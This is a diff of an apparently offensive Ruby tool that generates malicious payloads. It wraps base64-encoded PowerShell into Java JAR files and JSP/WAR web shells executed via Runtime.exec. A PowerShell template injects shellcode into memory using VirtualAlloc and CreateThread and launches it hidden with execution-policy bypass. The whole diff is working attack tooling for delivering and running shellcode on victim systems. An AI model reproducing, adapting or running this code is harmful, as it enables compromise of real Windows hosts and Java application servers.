@@ -1,6 +1,6 @@
 #!/usr/bin/env ruby
 #Author: Andrew Bonstrom
-#v1.1
+#v1.2
 #Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
 require 'io/console'
 require 'base64'
@@ -13,12 +13,10 @@ end
 #Payload Functions Begin
 #######################################################################################################################
 #This first is for creating a jar file that executes the base64 encoded powershell syntax
-def gen_jarFile (shellcode, fileName)
-	#Strips out the \n char that unicorn adds at the end
-	shellcode = shellcode.strip.gsub(/\s+/, ' ')
+def gen_jarFile (base64Command, fileName)
 	#Building the .java one liner
 	javaFile1 = 'import java.io.*;public class' + ' ' +fileName + '{public static void main(String args[]){try{Process p = Runtime.getRuntime().exec("' 
-        javaFile2 = javaFile1 + shellcode + '");}catch(IOException e1){}}}'
+        javaFile2 = javaFile1 + base64Command + '");}catch(IOException e1){}}}'
 	#Write the one liner to a file.Name.java
 	File.open(fileName+".java", "w") do |f|     
 		f.write(javaFile2)   
@@ -104,7 +102,7 @@ f.write(tempWebStr.to_s.gsub("fileName", fileName))
 <% 
 Process p=Runtime.getRuntime().exec("base64Command");
 %>
-		EOS2
+EOS2
                 f.write(tempJspStr.to_s.sub("base64Command", base64Command))
 	end
 	exec ('mkdir tempDir&&mkdir tempDir/WEB-INF&&mv ' + fileName + '.jsp tempDir&&mv web.xml tempDir/WEB-INF&&cd tempDir/&&jar cvf ' + fileName + '.war *&&mv ' + fileName + '.war ../&&cd ../&&rm -rf tempDir')
@@ -148,7 +146,7 @@ end
 def gen_command(shellcode)
 	str = <<-EOS
 	$var = '$RgJTJokYRNwbHQ = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$JLOgmnlpEHlaQgk = Add-Type -memberDefinition $RgJTJokYRNwbHQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]] $xuigDWqpcchqI = shellcodehere;$cDPWgScbWjEED = $JLOgmnlpEHlaQgk::VirtualAlloc(0,[Math]::Max($xuigDWqpcchqI.Length,0x1000),0x3000,0x40);for ($OArfsQVSOrBoW=0;$OArfsQVSOrBoW -le ($xuigDWqpcchqI.Length-1);$OArfsQVSOrBoW++){$JLOgmnlpEHlaQgk::memset([IntPtr]($cDPWgScbWjEED.ToInt32()+$OArfsQVSOrBoW), $xuigDWqpcchqI[$OArfsQVSOrBoW], 1) | Out-Null};$JLOgmnlpEHlaQgk::CreateThread(0,0,$cDPWgScbWjEED,0,0,0);for (;;){Start-sleep 60};';$newVar = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($var));$arch = $ENV:Processor_Architecture;if($arch -ne'x86'){$cmd = "%systemroot%\syswow64\windowspowershell\v1.0\powershell.exe -windowstyle hidden -enc ";iex $cmd $newVar}else{iex "$var"};
-	EOS
+EOS
 	mainStr = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + Base64.strict_encode64(str.to_s.sub("shellcodehere", shellcode).encode("utf-16le"))
 	return mainStr
 end
